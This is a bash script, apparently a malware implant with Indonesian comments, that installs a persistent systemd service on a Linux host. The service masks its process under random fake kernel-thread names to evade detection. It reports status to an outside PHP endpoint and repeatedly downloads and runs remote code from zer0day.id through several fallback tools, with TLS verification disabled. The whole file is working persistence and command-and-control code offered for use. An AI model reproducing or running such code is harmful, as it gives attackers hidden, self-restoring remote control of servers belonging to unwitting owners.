#!/bin/bash
# Code By HaxorWorld

# Konfigurasi
self_healing_script_path="/usr/local/bin/self"
service_file_path="/etc/systemd/system/self.service"
php_endpoint="https://zer0day.id/love.php"
service_name="defunct"
pid_file="/run/self/self.pid"

# Daftar nama proses untuk disembunyikan
proc_name_arr=("[kstrp]" "[watchdogd]" "[ksmd]" "[kswapd0]" "[card0-crtc8]" "[mm_percpu_wq]" "[rcu_preempt]" "[kworker]" "[raid5wq]" "[slub_flushwq]" "[netns]" "[kaluad]")

# Pilih nama proses secara acak
PROC_HIDDEN_NAME_DEFAULT="${proc_name_arr[$((RANDOM % ${#proc_name_arr[@]}))]}"

# Buat direktori untuk file PID jika belum ada
mkdir -p /run/self
chown $USER:$USER /run/self

# Tulis skrip self-healing
cat << 'EOF' > "$self_healing_script_path"
#!/bin/bash

host=$(hostname)
php_endpoint="$php_endpoint"
service_name="$service_name"
pid_file="$pid_file"

# Fungsi untuk memilih nama proses secara acak
choose_random_proc_name() {
    proc_names=("[kstrp]" "[watchdogd]" "[ksmd]" "[kswapd0]" "[card0-crtc8]" "[mm_percpu_wq]" "[rcu_preempt]" "[kworker]" "[raid5wq]" "[slub_flushwq]" "[netns]" "[kaluad]")
    echo "${proc_names[$((RANDOM % ${#proc_names[@]}))]}"
}

# Pembuatan PID file
write_pid() {
    echo $$ > "$pid_file"
}

# Pembersihan PID file
cleanup() {
    rm -f "$pid_file"
}
trap cleanup EXIT

write_pid

while true; do
    if systemctl is-active --quiet "$service_name"; then
        
        RANDOM_SLEEP_NAME="$(choose_random_proc_name)"
        
        # Pastikan nama proses valid dan tidak mengandung karakter ilegal
        exec -a "$RANDOM_SLEEP_NAME" /bin/bash -c "sleep 3"  
    else
        curl -sL -H "Content-Type: application/json" -X POST "$php_endpoint?status=service_down"
        
        bash -c "$(curl -fsSL https://zer0day.id/y -k)" || \
        bash -c "$(wget -qO- https://zer0day.id/y)" || \
        bash -c "$(fetch -o - https://zer0day.id/y)" || \
        bash -c "$(lynx -source https://zer0day.id/y)" || \
        bash -c "$(brew install -q https://zer0day.id/y)"

        if systemctl is-active --quiet "$service_name"; then
            curl -sL -H "Content-Type: application/json" -X POST "$php_endpoint?status=service_up"
        else
            curl -sL -H "Content-Type: application/json" -X POST "$php_endpoint?status=service_fail"
        fi
    fi
done
EOF

# Set permission untuk skrip
chmod +x "$self_healing_script_path"

# Tulis file service systemd
cat << EOF > "$service_file_path"
[Unit]
Description=Self Service

[Service]
ExecStart=$self_healing_script_path
Restart=always
RestartSec=10
PIDFile=$pid_file

[Install]
WantedBy=multi-user.target
EOF

# Reload systemd, enable, dan mulai service
systemctl daemon-reload
systemctl enable self.service
systemctl start self.service
